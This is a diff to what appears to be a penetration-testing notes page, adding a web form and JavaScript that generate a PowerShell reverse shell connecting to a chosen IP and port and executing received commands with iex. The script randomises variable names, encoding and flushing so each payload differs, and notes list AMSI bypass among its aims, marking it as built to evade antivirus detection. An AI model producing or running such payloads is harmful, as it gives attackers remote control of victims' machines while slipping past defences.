@@ -6,6 +6,76 @@ order: 5
 # AD Mindmap 
 [Repo Link](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)
 
+# Powershell Payload Gen
+<div class="container">
+    <div class="row">
+        <div class="col-md-6">
+            <form>
+                <div class="form-group">
+                    <label for="ip">IP Address</label>
+                    <input type="text" class="form-control" id="ip" placeholder="191.168.x.x" />
+                </div>
+                <div class="form-group">
+                    <label for="port">Port</label>
+                    <input type="text" class="form-control" id="port" placeholder="9001" />
+                </div>
+                <button type="button" class="btn btn-primary mt-2" onclick="generateCode()">Generate</button>
+            </form>
+        </div>
+    </div>
+    <div class="row mt-4" id="outputContainer" style="display: none;">
+        <div class="col-12">
+            <div id="output" class="p-3 bg-dark text-white rounded" style="white-space: pre-wrap; font-family: monospace;"></div>
+        </div>
+    </div>
+</div>
+
+<script>
+    function getRandomVariable() {
+        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        let varName = '';
+        for (let i = 0; i < Math.floor(Math.random() * 5) + 5; i++) {
+            varName += chars[Math.floor(Math.random() * chars.length)];
+        }
+        return varName;
+    }
+
+    function generateByteArray(variableName) {
+        return `[byte[]]$${variableName} = New-Object byte[] 65535;`;
+    }
+
+    function generateCode() {
+        const ip = document.getElementById("ip").value;
+        const port = document.getElementById("port").value;
+
+        if (!ip || !port) {
+            alert("Please enter both IP and port");
+            return;
+        }
+
+        const varClient = getRandomVariable();
+        const varStream = getRandomVariable();
+        const varBytes = getRandomVariable();
+        const varData = getRandomVariable();
+        const varSendback = getRandomVariable();
+        const varSendback2 = getRandomVariable();
+        const varSendbyte = getRandomVariable();
+        const varI = getRandomVariable();
+        const varEncoding = Math.random() < 0.5 ? "ASCII" : "UTF8";
+        const flushMethod = Math.random() < 0.5 ? "$stream.Flush();" : "[System.Threading.Thread]::Sleep(100);";
+
+        const byteArrayInit = generateByteArray(varBytes);
+
+        const powershellTemplate = `
+$${varClient}=New-Object System.Net.Sockets.TCPClient("${ip}",${port});$${varStream}=$${varClient}.GetStream();${byteArrayInit}while(($${varI}=$${varStream}.Read($${varBytes},0,$${varBytes}.Length)) -ne 0){$${varData}=(New-Object -TypeName System.Text.${varEncoding}Encoding).GetString($${varBytes},0,$${varI});$${varSendback}=try{iex $${varData} 2>&1 | Out-String}catch{\$_};$${varSendback2}=$${varSendback}+"[>] ";$${varSendbyte}=([text.encoding]::${varEncoding}).GetBytes($${varSendback2});$${varStream}.Write($${varSendbyte},0,$${varSendbyte}.Length);${flushMethod}};$${varClient}.Close();
+        `.replace(/\s+/g, ' ').replace(/\s?;\s?/g, ';').replace(/\s?{\s?/g, '{').trim();
+
+        document.getElementById("output").innerText = powershellTemplate;
+        document.getElementById('outputContainer').style.display = 'block';
+    }
+</script>
+
+
 ## 🛠 Powershell Payload Generator Tool 
 - Always Generate unique Random words in payload.
 - AMSI Bypass.
